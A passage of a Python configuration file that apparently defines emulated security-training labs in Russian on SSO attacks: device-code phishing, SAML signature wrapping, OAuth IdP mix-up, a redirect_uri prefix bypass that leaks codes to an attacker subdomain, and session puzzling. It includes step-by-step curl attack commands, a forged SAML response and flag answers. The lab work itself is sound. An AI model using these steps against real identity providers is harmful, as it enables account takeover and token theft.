                     'example': "-s 'https://acmeid.example/device/approve?user_code=WDJB-MJHT&device_code=GmRhmhcxhwAzkoEqiMEg'",
                     'output': (
                         '{"status":"approved","user":"victim@corp.example",'
                         '"note":"tokens issued to the device that started the flow",'
                         '"access_token":"eyJhbGciOiJIUzI1NiJ9.victim.abc",'
                         '"flag":"nto{d3v1c3_c0d3_ph1sh1ng_t0k3n_st34l}"}\n'
                     )},
                    {'match': r'device/token',
                     'example': "-s 'https://acmeid.example/device/token' -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=GmRhm...&client_id=shop-tv'",
                     'output': '{"error":"authorization_pending","interval":5}\n'},
                    {'match': r'device/code',
                     'example': "-s 'https://acmeid.example/device/code' -d 'client_id=shop-tv&scope=openid'",
                     'output': (
                         '{"device_code":"GmRhmhcxhwAzkoEqiMEg_DnyEysNkuNhszIySk9eS",'
                         '"user_code":"WDJB-MJHT","verification_uri":"https://acmeid.example/device",'
                         '"expires_in":1800,"interval":5}\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /device/code, /device/token и /device/approve на acmeid.example.\n',
            }
        },
    },
    {
        'id': 'web-saml-deep',
        'category': 'web',
        'title': 'Практика: SAML XML Signature Wrapping',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'saml_b64.txt', 'evil_saml.xml'],
        'check': CHECK,
        'hints': [
            'Декодируй исходный SAML-ответ: `cat saml_b64.txt | base64 -d` — увидишь `role=user`.',
            'В `evil_saml.xml` уже собран XSW-ответ: внешний assertion с `role=admin` оборачивает подписанный (внутренний).',
            'Закодируй его и отправь на ACS: `base64 -w0 evil_saml.xml > evil.b64`.',
            "`curl -s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64 | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{s4ml_xsw_s1gn4tur3_wr4pp3d}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: SAML XML Signature Wrapping (XSW)\n\n"
                "Приложение (SP) проверяет подпись assertion, но читает НЕ тот узел, что\n"
                "подписан. В `evil_saml.xml` внешний assertion содержит `role=admin`, а\n"
                "внутрь вложен подлинный (подписанный, `role=user`).\n\n"
                "1. Посмотри исходный ответ:\n"
                "   cat saml_b64.txt | base64 -d\n"
                "2. Закодируй подготовленный XSW-ответ:\n"
                "   base64 -w0 evil_saml.xml > evil.b64\n"
                "3. Отправь его на ACS (сервер проверит подпись на внутреннем assertion,\n"
                "   а роль прочитает из внешнего):\n"
                "   curl -s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64\n"
                "4. В ответе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
            {'path': WD + '/saml_b64.txt',
             'text': base64.b64encode((
                 '<samlp:Response><saml:Assertion ID="a1">'
                 '<saml:Subject><saml:NameID>alice@corp.example</saml:NameID></saml:Subject>'
                 '<saml:AttributeStatement><saml:Attribute Name="role">'
                 '<saml:AttributeValue>user</saml:AttributeValue>'
                 '</saml:Attribute></saml:AttributeStatement>'
                 '<ds:Signature>VALID_SIG</ds:Signature>'
                 '</saml:Assertion></samlp:Response>'
             ).encode()).decode() + '\n'},
            {'path': WD + '/evil_saml.xml',
             'text': (
                 '<samlp:Response>\n'
                 '  <saml:Assertion ID="evil">\n'
                 '    <saml:Subject><saml:NameID>admin@corp.example</saml:NameID></saml:Subject>\n'
                 '    <saml:AttributeStatement>\n'
                 '      <saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>\n'
                 '    </saml:AttributeStatement>\n'
                 '    <saml:Assertion ID="a1">\n'
                 '      <ds:Signature>VALID_SIG</ds:Signature>\n'
                 '    </saml:Assertion>\n'
                 '  </saml:Assertion>\n'
                 '</samlp:Response>\n'
             )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local/saml/acs)',
                'cases': [
                    {'match': r'evil\.b64',
                     'example': "-s -X POST 'https://shop.local/saml/acs' --data-binary @evil.b64",
                     'output': (
                         '{"status":"authenticated","subject":"admin@corp.example",'
                         '"role":"admin","signature":"valid",'
                         '"note":"signature checked on inner assertion, role read from outer",'
                         '"flag":"nto{s4ml_xsw_s1gn4tur3_wr4pp3d}"}\n'
                     )},
                    {'match': r'saml/acs',
                     'example': "-s -X POST 'https://shop.local/saml/acs' --data-binary @orig.b64",
                     'output': 'HTTP/1.1 403 Forbidden\n\n{"error":"assertion signature invalid or not trusted"}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируется только https://shop.local/saml/acs.\n',
            }
        },
    },
    {
        'id': 'web-sso-mixup',
        'category': 'web',
        'title': 'Практика: OAuth mix-up (путаница провайдеров)',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Приложение умеет входить через двух провайдеров: `acmeid.example` и `corp.example`.',
            'На callback оно доверяет параметру `idp` из ЗАПРОСА, а не значению, сохранённому в сессии.',
            'Подставь своего провайдера: `.../cb?code=CODE_FROM_CORP&idp=evil.example`.',
            "`curl -s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{0auth_m1xup_c0d3_c0nfus10n}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: OAuth/SSO mix-up\n\n"
                "`shop.local` доверяет двум провайдерам (`acmeid.example` и `corp.example`).\n"
                "На callback оно берёт `idp` из параметров запроса, а не из сессии, и\n"
                "обменивает код у того, кого назвал клиент. Подмени провайдера на свой.\n\n"
                "1. Начни вход через acmeid (сервер запомнил idp=acmeid в сессии):\n"
                "   curl -s -i 'https://shop.local/login?provider=acmeid'\n"
                "2. Жертва авторизовалась у `corp.example`, пришёл `code=CODE_FROM_CORP`.\n"
                "   Подставь СВОЙ провайдер в параметре `idp`:\n"
                "   curl -s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example'\n"
                "3. Приложение обменяет код у evil.example и примет чужой токен — флаг.\n"
                "4. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция shop.local SSO)',
                'cases': [
                    {'match': r'idp=evil',
                     'example': "-s 'https://shop.local/cb?code=CODE_FROM_CORP&idp=evil.example'",
                     'output': (
                         '{"status":"logged_in","subject":"victim@corp.example",'
                         '"note":"callback trusted idp from request, not session",'
                         '"flag":"nto{0auth_m1xup_c0d3_c0nfus10n}"}\n'
                     )},
                    {'match': r'cb\?code',
                     'example': "-s 'https://shop.local/cb?code=CODE_FROM_CORP&state=abc'",
                     'output': '{"error":"invalid_grant","reason":"code not issued by expected idp"}\n'},
                    {'match': r'login\?provider',
                     'example': "-s -i 'https://shop.local/login?provider=acmeid'",
                     'output': (
                         'HTTP/1.1 302 Found\n'
                         'Set-Cookie: idp=acmeid; Path=/\n'
                         'Location: https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local/cb&state=abc\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируются /login?provider и /cb на shop.local.\n',
            }
        },
    },
    {
        'id': 'web-oauth-oidc-saml',
        'category': 'web',
        'title': 'Практика: обход проверки redirect_uri',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Провайдер проверяет `redirect_uri` наивно — «начинается с разрешённого домена».',
            'Полностью чужой домен отклоняется: `https://our-server.evil/callback`.',
            'Используй поддомен, начинающийся с разрешённого: `https://shop.local.evil.com/callback`.',
            "`curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123' | tail -1 > found.txt`, затем `check`.",
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{r3d1r3ct_ur1_pr3f1x_byp4ss}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: redirect_uri prefix bypass\n\n"
                "Провайдер `acmeid.example` проверяет `redirect_uri` как «начинается с\n"
                "https://shop.local». Наивная проверка пропускает поддомен\n"
                "`shop.local.evil.com`, которым управляет атакующий — туда утечёт код.\n\n"
                "1. Легитимный запрос:\n"
                "   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local/oauth/callback&state=xyz123'\n"
                "2. Чужой домен — отказ:\n"
                "   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://our-server.evil/callback&state=xyz123'\n"
                "3. Prefix bypass:\n"
                "   curl -s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123'\n"
                "4. Код утёк на наш домен — в выводе флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция acmeid.example/authorize)',
                'cases': [
                    {'match': r'shop\.local\.evil\.com',
                     'example': "-s -i 'https://acmeid.example/authorize?response_type=code&client_id=shop&redirect_uri=https://shop.local.evil.com/callback&state=xyz123'",
                     'output': (
                         'HTTP/1.1 302 Found\n'
                         'Location: https://shop.local.evil.com/callback?code=SplxlOBeZQQYbYS6WxSbIA&state=xyz123\n'
                         'X-Debug: prefix-match bypassed allowlist '
                         'nto{r3d1r3ct_ur1_pr3f1x_byp4ss}\n'
                     )},
                    {'match': r'our-server\.evil',
                     'example': "-s -i 'https://acmeid.example/authorize?...&redirect_uri=https://our-server.evil/callback'",
                     'output': 'HTTP/1.1 400 Bad Request\n\n{"error":"invalid_request","error_description":"redirect_uri not allowed"}\n'},
                    {'match': r'authorize',
                     'example': "-s -i 'https://acmeid.example/authorize?...&redirect_uri=https://shop.local/oauth/callback'",
                     'output': (
                         'HTTP/1.1 302 Found\n'
                         'Location: https://shop.local/oauth/callback?code=LEGIT123&state=xyz123\n'
                     )},
                ],
                'fallback': 'curl: в этой лабе эмулируется только https://acmeid.example/authorize.\n',
            }
        },
    },
    {
        'id': 'web-session-puzzling',
        'category': 'web',
        'title': 'Практика: session puzzling (переиспользование ключа)',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md'],
        'check': CHECK,
        'hints': [
            'Регистрация в два шага: step1 пишет email в сессию под ключом `pending`.',
            'Сброс пароля пишет в ТОТ ЖЕ ключ `pending` email жертвы.',
            'Начни регистрацию, затем запусти сброс для жертвы — ключ перезапишется.',
            'Затем заверши регистрацию той же cookie: `curl -s -b jar -X POST https://t/register/step2 -d \'password=Pwn1!\' | tail -1 > found.txt`, затем `check`.',
        ],
        'expect': {'file': WD + '/found.txt', 'contains': 'nto{s3ss10n_puzzl1ng_cr0ss_fl0w}'},
        'fs': [
            {'path': WD, 'type': 'dir'},
            {'path': WD + '/task.md', 'text': (
                "# Практика: session puzzling\n\n"
                "Разные флоу приложения используют ОДИН ключ сессии `pending` для разных\n"
                "целей: регистрация хранит там email нового пользователя, сброс пароля —\n"
                "email восстанавливаемого. Перезапиши ключ одним флоу и прочитай другим.\n\n"
                "1. Начни регистрацию (ключ `pending=attacker@x.com`):\n"
                "   curl -s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'\n"
                "2. Запусти сброс для ЖЕРТВЫ той же cookie (ключ перезаписан):\n"
                "   curl -s -b jar -c jar -X POST https://t/forgot -d 'email=victim@corp.com'\n"
                "3. Заверши регистрацию — пароль установится жертве:\n"
                "   curl -s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'\n"
                "4. В ответе — флаг. Запиши последнюю строку в `found.txt` и набери `check`.\n"
            )},
        ],
        'tools': {
            'curl': {
                'help': 'curl [опции] <url> — HTTP-клиент (эмуляция t/register и /forgot)',
                'cases': [
                    {'match': r'register/step2',
                     'example': "-s -b jar -X POST https://t/register/step2 -d 'password=Pwn1!'",
                     'output': (
                         '{"ok":true,"user":"victim@corp.com",'
                         '"note":"password set for pending account (session key reused)",'
                         '"flag":"nto{s3ss10n_puzzl1ng_cr0ss_fl0w}"}\n'
                     )},
                    {'match': r'forgot',
                     'example': "-s -b jar -c jar -X POST https://t/forgot -d 'email=victim@corp.com'",
                     'output': '{"status":"sent","pending":"victim@corp.com"}\n'},
                    {'match': r'register/step1',
                     'example': "-s -c jar -X POST https://t/register/step1 -d 'email=attacker@x.com'",
                     'output': '{"step":"password","pending":"attacker@x.com"}\n'},
                ],
                'fallback': 'curl: в этой лабе эмулируются /register/step1, /register/step2 и /forgot на t.\n',
            }
        },
    },
]
